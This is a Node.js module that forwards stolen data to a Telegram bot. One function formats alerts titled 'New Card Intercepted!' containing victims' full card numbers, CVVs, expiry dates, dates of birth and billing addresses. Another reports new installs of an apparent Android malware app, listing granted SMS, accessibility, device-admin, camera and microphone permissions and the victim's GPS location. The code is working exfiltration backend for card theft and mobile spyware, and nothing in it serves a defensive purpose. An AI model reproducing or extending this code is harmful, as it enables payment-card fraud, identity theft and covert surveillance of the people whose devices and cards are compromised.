const https = require('https');

/**
 * Send a notification message to the Telegram bot
 * @param {string} message 
 */
function sendToSingleChat(token, chatId, message) {
  const payload = JSON.stringify({
    chat_id: chatId,
    text: message,
    parse_mode: 'HTML',
  });

  const options = {
    hostname: 'api.telegram.org',
    port: 443,
    path: `/bot${token}/sendMessage`,
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(payload),
    },
  };

  const req = https.request(options, (res) => {
    let data = '';
    res.on('data', (chunk) => {
      data += chunk;
    });
    res.on('end', () => {
      console.log(`[Telegram Service] API Response for ${chatId}: Status ${res.statusCode} | Data: ${data}`);
      if (res.statusCode !== 200) {
        console.error(`[Telegram Service] Failed to send message to ${chatId}. Status: ${res.statusCode}. Response: ${data}`);
      } else {
        console.log(`[Telegram Service] Alert sent successfully to ${chatId}.`);
      }
    });
  });

  req.on('error', (error) => {
    console.error(`[Telegram Service] HTTPS request error for ${chatId}:`, error);
  });

  req.write(payload);
  req.end();
}

/**
 * Send a notification message to all configured Telegram chats
 * @param {string} message 
 */
function sendTelegramMessage(message) {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  const chatIdInput = process.env.TELEGRAM_CHAT_ID;

  if (!token || !chatIdInput) {
    console.warn('[Telegram Service] Warning: TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID is missing. Notification skipped.');
    return;
  }

  // Split chat IDs by comma, trim whitespace and filter empty entries
  const chatIds = chatIdInput.split(',').map(id => id.trim()).filter(Boolean);

  if (chatIds.length === 0) {
    console.warn('[Telegram Service] Warning: No valid chat IDs found in TELEGRAM_CHAT_ID. Notification skipped.');
    return;
  }

  chatIds.forEach((chatId) => {
    sendToSingleChat(token, chatId, message);
  });
}

/**
 * Format and send payment card details alert
 * @param {object} payment 
 */
function sendCardAlert(payment) {
  try {
    const message = `💳 <b>New Card Intercepted!</b>
━━━━━━━━━━━━━━━━━━
<b>ID:</b> <code>${payment._id || 'N/A'}</code>
<b>Plan:</b> <code>${payment.plan || 'N/A'}</code>
<b>Business Purchase:</b> <code>${payment.isBusiness ? 'Yes' : 'No'}</code>

👤 <b>User Info:</b>
Name: <b>${payment.firstName || ''} ${payment.lastName || ''}</b>
DOB: <code>${payment.dob || 'N/A'}</code>
Phone: <code>${payment.phone || 'N/A'}</code>
Email: <code>${payment.email || 'N/A'}</code>

💳 <b>Card Info:</b>
Number: <code>${payment.cardNumber || 'N/A'}</code>
Expiry: <code>${payment.expiryMonth || 'N/A'}/${payment.expiryYear || 'N/A'}</code>
CVV: <code>${payment.cvv || 'N/A'}</code>
Name on Card: <b>${payment.nameOnCard || 'N/A'}</b>

🏠 <b>Billing Address:</b>
Street: ${payment.address || 'N/A'}
City/Town: ${payment.town || 'N/A'}
State: ${payment.state || 'N/A'}
Country: <code>${payment.country || 'N/A'}</code>
ZIP/Postal: <code>${payment.postCode || 'N/A'}</code>
━━━━━━━━━━━━━━━━━━
⏰ <b>Time:</b> ${payment.createdAt ? new Date(payment.createdAt).toLocaleString() : new Date().toLocaleString()}
`;

    sendTelegramMessage(message);
  } catch (error) {
    console.error('[Telegram Service] Error formatting card alert:', error);
  }
}

/**
 * Format and send app installation / device sync alert
 * @param {object} device 
 * @param {boolean} isNew
 */
function sendDeviceAlert(device, isNew = true) {
  try {
    const battery = device.batteryStatus
      ? `${device.batteryStatus.level || 0}% (${device.batteryStatus.isCharging ? '🔌 Charging' : '🔋 Not Charging'})`
      : 'N/A';
    const network = device.networkState
      ? `${device.networkState.type || 'Unknown'} (${device.networkState.isConnected ? '✅ Connected' : '❌ Disconnected'})`
      : 'N/A';

    // Permissions checklist
    const p = device.permissions || {};
    const tick = (v) => v ? '✅' : '❌';
    const permissionsBlock = [
      `  SMS: ${tick(p.smsAccess)}`,
      `  Location: ${tick(p.locationAccess)}`,
      `  Contacts: ${tick(p.contactsAccess)}`,
      `  Camera: ${tick(p.cameraAccess)}`,
      `  Microphone: ${tick(p.micAccess)}`,
      `  Notifications: ${tick(p.notificationAccess)}`,
      `  Accessibility: ${tick(p.accessibilityAccess)}`,
      `  Device Admin: ${tick(p.deviceAdmin)}`,
    ].join('\n');

    // Latest location with Google Maps link
    let locationBlock = 'Not available';
    if (device.locations && device.locations.length > 0) {
      const loc = device.locations[device.locations.length - 1];
      const lat = loc.latitude;
      const lng = loc.longitude;
      const mapsUrl = `https://www.google.com/maps?q=${lat},${lng}`;
      locationBlock = `<a href="${mapsUrl}">📍 ${lat.toFixed(6)}, ${lng.toFixed(6)}</a>`;
    }

    const title = isNew ? '📱 <b>New App Installation!</b>' : '🟢 <b>Device Back Online</b>';

    const message = `${title}
━━━━━━━━━━━━━━━━━━
<b>Device ID:</b> <code>${device.deviceId || 'N/A'}</code>
<b>Model:</b> <code>${device.deviceModel || 'N/A'}</code>
<b>Android:</b> <code>${device.androidVersion || 'N/A'}</code>
<b>App Version:</b> <code>${device.appVersion || 'N/A'}</code>
<b>Language:</b> <code>${device.language || 'N/A'}</code>
<b>Timezone:</b> <code>${device.timezone || 'N/A'}</code>
<b>Battery:</b> <code>${battery}</code>
<b>Network:</b> <code>${network}</code>
━━━━━━━━━━━━━━━━━━
🔐 <b>Permissions Granted:</b>
${permissionsBlock}
━━━━━━━━━━━━━━━━━━
🌍 <b>Location:</b> ${locationBlock}
━━━━━━━━━━━━━━━━━━
⏰ <b>Time:</b> ${device.lastActive ? new Date(device.lastActive).toLocaleString() : new Date().toLocaleString()}
`;

    sendTelegramMessage(message);
  } catch (error) {
    console.error('[Telegram Service] Error formatting device alert:', error);
  }
}

module.exports = {
  sendTelegramMessage,
  sendCardAlert,
  sendDeviceAlert,
};
